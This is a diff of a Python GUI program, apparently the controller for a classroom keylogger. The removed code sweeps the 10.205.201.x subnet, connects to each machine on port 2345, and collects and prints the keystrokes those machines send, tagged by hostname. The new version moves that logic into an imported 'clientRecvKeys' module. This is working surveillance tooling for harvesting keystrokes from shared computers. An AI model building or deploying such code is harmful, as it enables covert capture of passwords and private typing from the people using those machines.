@@ -14,119 +14,12 @@ import tkinter as tk
 # todo : make auto install or use setup.py
 from PIL import Image, ImageTk
 
+from clientRecvKeys import Client
+
 DEFAULT_CLASSROOM = '201'
 PORT = 2345
 
 CHECK_CONN_HOST_INTERVAL = 10
-
-# --- Socket related functions ---
-
-def generate_ip_for_classroom(classroom:str=DEFAULT_CLASSROOM) -> list[str]:
-    """
-     Generate a list of IPs for a given classroom. Start at 10.205.{classroom}.100 to 10.205.{classroom}.251
-     
-     Args:
-     	 classroom: The name of the classroom. Defaults to 201.
-     
-     Returns: 
-     	 A list of IP addresses in dotted decimal format ( 10. 205. { classroom }. { i + 100 } )
-    """
-    return [f"10.205.{classroom}.{i+100}" for i in range(1, 151)]
-
-
-def recv_host_key(s:socket.socket, host:str):
-    """
-     Receive host key from socket and add to list of keys in a loop as long as the host is connected
-
-     todo : add timeout to revc so the programm can close (dont block until it receive)
-     
-     Args:
-     	 s: socket to recieve data from. This is used to create a list of keys
-     	 host: host to which the key is connected. This is used to determine the key type
-     
-     Returns: 
-     	 None if everything went fine error message if something went wrong
-    """
-    global keys, isRunning
-
-    while isRunning: # main loop
-        try:
-            data = s.recv(1024) # {'hostname': 'SIOP0201-EDU-11', 'keys': [{'key': 'maj', 'time': 1694068657.8892527}]}
-        except socket.error:
-            return f"Connection timed out by {host} 💥"
-
-        if not data:
-            return f"Connection closed by {host} 🚧"
-        
-        try:
-            data_json = json.loads(data.decode("utf-8"))
-        except json.JSONDecodeError: # the keys on the server are longer than 1024 characters
-            print(f"can't decode : {data.decode('utf-8')}")
-
-        hostname = data_json.get("hostname")
-
-        hosts_connected_name[host]["hostname"] = hostname
-
-        # create new list of keys for this host or append to existing list
-        keys.setdefault(hostname, []).extend(data_json.get("keys"))
-
-        print(f"{hostname} > {''.join([k['key'] for k in data_json.get('keys')])}")
-
-
-def conn_host(host:str):
-    """
-     Connect to a host and receive keystrokes from it.
-     
-     Args:
-     	 host: The host to connect to
-    
-    """
-    global keys, hosts_connected_name
-
-    if host in hosts_connected_name: return # if the host is already connected, don't reconnect to it
-
-
-    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
-        s.settimeout(1) # so it don't try to connect for too long
-
-        try: s.connect((host, PORT))
-
-        except socket.timeout: return # if you can't connect just return
-
-        s.settimeout(None) # so it cant wait until it receives data
-
-        # New connection
-        print(f"New connection to {host} 🛫")
-        hosts_connected_name[host] = {"hostname" : None, "component" : None}
-
-        recv_host_key(s, host)
-
-
-    hosts_connected_name.pop(host)
-
-
-def try_to_connect_to_classroom(classroom:str=DEFAULT_CLASSROOM):
-    """
-     Try to connect to every host in a classroom.
-     
-     Args:
-     	 classroom: Name of the classroom
-    """
-    """Try to connect to every host in a given classroom"""
-    for ip in generate_ip_for_classroom(classroom):
-        threading.Thread(target=conn_host, args=(ip,)).start()
-
-
-def try_to_connect_to_classroom_for_ever():
-    """
-     Try to connect to classroom for ever. This is a long running function that will wait CHECK_CONN_HOST_INTERVAL between attempts
-    """
-    global isRunning
-
-    while isRunning:
-        try_to_connect_to_classroom(DEFAULT_CLASSROOM)
-
-        time.sleep(CHECK_CONN_HOST_INTERVAL)
 
 # --- Other functions ---
 
@@ -137,9 +30,10 @@ def on_window_close(root:tk.Tk):
      Args:
      	 root: The root window
     """
-    global isRunning
+    global isRunning, client
 
     isRunning = False
+    client.is_running = False
     root.destroy()
 
 # --- Components ---
@@ -377,5 +271,8 @@ if __name__ == "__main__":
     hosts_connected_name = {}
     isRunning = True
     notification_manger = NotificationManager()
-    threading.Thread(target=try_to_connect_to_classroom_for_ever).start()
+
+    client = Client(DEFAULT_CLASSROOM, PORT, CHECK_CONN_HOST_INTERVAL)
+
+    threading.Thread(target=client.try_to_connect_to_classroom_for_ever).start()
     main()
